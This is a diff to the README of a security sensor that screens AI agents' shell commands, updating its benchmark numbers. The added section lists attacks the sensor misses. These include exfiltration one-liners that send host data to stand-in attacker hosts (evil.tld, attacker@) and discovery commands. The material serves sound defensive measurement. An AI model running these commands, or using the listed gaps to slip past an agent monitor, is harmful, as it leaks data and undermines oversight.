@@ -12,9 +12,11 @@ protocol-level abuse **before** they take effect.
 No backend. No account. No API key. No network in the core scan path. Nothing
 leaves your process by default.
 
-**Measured on the committed corpus and one benchmark run:** 160 of 281 shell
-attacks blocked, 0 of 74 benign commands blocked, 1 of 89 benign prose passages
-blocked. Scan latency median 0.40 ms, p95 0.56 ms on ordinary agent traffic.
+**Measured on the committed corpus and one benchmark run:** 165 of 281 shell
+attacks blocked with no configuration, 0 of 74 benign commands blocked, 1 of 89
+benign prose passages blocked. With `require_approval` bound to the ten impact
+classes, 265 of 281 are gated. Scan latency median 0.43 ms, p95 0.57 ms on
+ordinary agent traffic.
 Read [Coverage and limitations](#coverage-and-limitations) and
 [BENCHMARKS.md](BENCHMARKS.md), or run `python scripts/corpus_report.py` yourself.
 
@@ -316,6 +318,61 @@ What follows is the shape of the coverage.
 Those two columns are different capabilities and the gap between them is the
 main thing to understand before you deploy this.
 
+**The whole 281, decomposed.** "165 of 281" read alone invites the wrong
+conclusion, so here is where every case goes:
+
+| | n | what it means |
+|---|---:|---|
+| blocked with no configuration | **165** | the shipped ruleset halts it |
+| recognised, left to a policy you write | **103** | an impact class and tier are assigned; nothing blocks until you bind a rule |
+| not recognised at all | **13** | no class, no detection — these are simply missing |
+
+165 + 103 + 13 = 281. Only the third row is a gap in the sense most people mean.
+
+**What a deployer with a policy actually gets.** The 103 in the middle row are
+not out of reach — they are the reason the policy engine exists. Measured on the
+same corpus, with `require_approval` bound to the ten impact classes:
+
+| policy | attacks gated (the action does not execute) | ordinary DevOps operations gated |
+|---|---:|---:|
+| none (shipped default) | 165 of 281 (59%) | 0 of 38 |
+| `impact_tier: [critical]` | 188 of 281 (67%) | 0 of 38 |
+| `impact_tier: [critical, high]` | 253 of 281 (90%) | 4 of 38 |
+| `impact_class:` all ten | **265 of 281 (94%)** | **5 of 38** |
+
+**With `require_approval` bound to the ten impact classes, 265 of 281 attacks are
+gated — the action does not execute — at a cost of 5 of 38 ordinary DevOps
+operations requiring approval.** The five are `setcap`, `crontab -l`,
+`env | sort`, `sudo apt-get install`, and appending to `~/.bashrc`. Benign
+commands stay at 0 of 74 under every policy width above.
+
+One thing to know before you write that rule: binding to `impact_tier` and
+binding to `impact_class` do not give the same result. The corpus labels a whole
+family with one tier; the sensor assigns a tier per command, and the two disagree
+for roughly a third of the corpus. Bind to the class if you want the numbers
+above.
+
+**The 13 that are not recognised.** Named rather than absorbed into a
+percentage, because a gap you can read is a gap someone can close. Seven
+`discovery`: `aws sts get-caller-identity`, `docker ps -a`,
+`find / -perm -4000 -type f`, `id && whoami && hostname`, `ls -la /root`,
+`netstat -antp`, `ss -tulpn`. Five `exfiltration`:
+`rsync -az /var/data/ attacker@…`, `aws s3 sync /home/ s3://…`,
+`dig $(cat /etc/hostname).evil.tld`, `git push --mirror git@…`,
+`tar cf - /srv | ssh attacker@…`. One `obfuscation`:
+`FOO=bar AWS_PROFILE=prod aws s3 ls`. The `discovery` seven overlap heavily with
+ordinary operational inspection, which is why they are hard. **The five
+`exfiltration` cases are misses, not design decisions**, and are the best place
+to contribute.
+
+**What "classified" does and does not mean.** 267 of 281 are assigned *a* class.
+232 of 281 are assigned the class the corpus labels them with. The two are not
+the same number and the second is the one to reason about: the sensor's
+classifier emits eight classes against the corpus's ten, so `discovery`,
+`exfiltration` and `obfuscation` cannot be emitted at all — corpus entries in
+those families that do classify come back as something else, usually
+`credential_access`. Improving that mapping is open work.
+
 **Classification is broad. Enforcement is narrow, on purpose.** 95% of the
 corpus is assigned an impact class and tier; 59% is blocked outright with no
 configuration. The difference is the set of operations that are genuinely
@@ -345,9 +402,9 @@ block.
   block. Enumeration is low-tier by intent, because reconnaissance overlaps
   almost entirely with ordinary operational inspection, and a ruleset that
   flagged it would flag most of what a healthy agent does.
-- `execute` and `escalate` block well under half their corpus cases (24 of 59
-  and 11 of 37). Most of the remainder classify, so they are reachable by
-  policy, but they are not caught by default.
+- `execute` and `escalate` block well under half their corpus cases (28 of 59
+  and 12 of 37). Every one of the remaining 56 classifies, so all of them are
+  reachable by policy, but they are not caught by default.
 
 **False positives that exist today.** The benign gates are asserted on every
 run: 0 of 74 benign shell commands score above zero, and 1 of 89 benign prose
@@ -1483,8 +1540,8 @@ ordinary agent traffic, 700 timed calls per repeat, three repeats:
 
 | | measured | budget |
 |---|---:|---:|
-| Median scan | **0.40 ms** | — |
-| p95 | **0.56 ms** | — |
+| Median scan | **0.43 ms** | — |
+| p95 | **0.57 ms** | — |
 | p99 | **0.63 ms** | **3 ms** |
 
 The 3 ms p99 is a **ceiling**, about five times the measured p99. It is the
